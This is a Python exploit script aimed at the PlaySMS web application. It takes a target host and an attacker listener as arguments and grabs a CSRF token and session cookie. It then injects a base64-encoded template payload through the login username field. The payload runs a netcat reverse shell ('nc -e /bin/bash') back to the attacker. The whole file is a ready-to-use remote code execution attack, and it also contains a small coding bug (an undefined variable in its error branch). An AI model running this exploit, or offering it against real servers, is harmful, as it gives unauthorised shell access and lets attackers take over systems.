#!/usr/bin/env python3

import requests
import sys
import base64

def usage():
    print("Usage: ")
    print(sys.argv[0] + " <target-ip> <target-port> <your-ip> <your-port>"  )

def base64_encode(text):
    return base64.b64encode(text.encode('ascii')).decode('ascii')

def create_revshell_encoded(lhost,lport):
    # Change if you need
    revshell = "/*<?php /**/ system('/bin/nc.traditional "+lhost + " " + lport + " -e /bin/bash');"
    revshell_encoded = base64_encode(revshell)
    revshell_encoded = revshell_encoded.split('=')[0]
    return revshell_encoded
    


if len(sys.argv) < 5:
    usage()
    exit(1)

try:
    rhost = sys.argv[1]
    rport = sys.argv[2]
    lhost = sys.argv[3]
    lport = sys.argv[4]
except:
    usage()
    exit(1)

# Preparing url
# IF THE SERVER IS HOSTING ON ANOTHER PATH, CHANGE IT HERE
BASE_PATH = "/playsms/"
base_url = "http://" + rhost + BASE_PATH

# Preparing headers:
userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"

# creating payload:
revshell_encoded = create_revshell_encoded(lhost,lport)
payload='{{eval(base64_decode(' + revshell_encoded +  '))}}'

# Creating session object
s = requests.Session()

print("#################################")
print("###  CrEaTeD by H3rm1tR3b0rn  ###")
print("#################################")

print("[INFO] You should already have the " + lport + " open on your machine with nc")


# First request:
print("[+] Sending the first packet...")
headers = {'User-Agent': userAgent, 'Connection': 'close'}
resp = s.get(base_url + "index.php?app=main&inc=core_auth&route=login",headers=headers)
try: 
    CSRFToken = resp.text.split('\n')[45].split('"')[5]
    cookie = resp.headers['Set-Cookie'].split(';')[0] + ';'
except:
    if resp.status_code == 404:
        print("[-] file " + url_base + "index.php not found")
    else:
        print("[-] Something went wrong...")
        print("[-] Quiting")
        exit(1)
print("[+] first packet was sent successfully...")
print("X-CSRF-Token     : " + CSRFToken )
print("Cookie           : " + cookie)



# Second request:

print("[+] Sending the second packet with the payload ...")
print("Payload          : ")

data = {'X-CSRF-Token':CSRFToken,'password':'','username':payload}

total_size = len(CSRFToken) 
total_size = total_size + 2 # & &
total_size = total_size + 3 # = = = 
total_size = total_size + 2*8+12 # 'username'+'X-CSRF-Token'+'password'

headers = {'User-Agent': userAgent,'Content-Type':'application/x-www-form-urlencoded','Content-Length':str(total_size),'Cookie': cookie,'Connection': 'close'}

resp = s.post(base_url + "index.php?inc=core_auth&route=login&op=login&app=main",data=data,allow_redirects=False, headers = headers)

if resp.status_code == 302:
    print("[+] Payload successfully sent...")


# Third request
print("[+] Sending the last packet...")
headers = {'User-Agent': userAgent,'Connection': 'close','Cookie':cookie}
resp = s.get(base_url + "index.php?app=main&inc=core_auth&route=login", headers = headers)
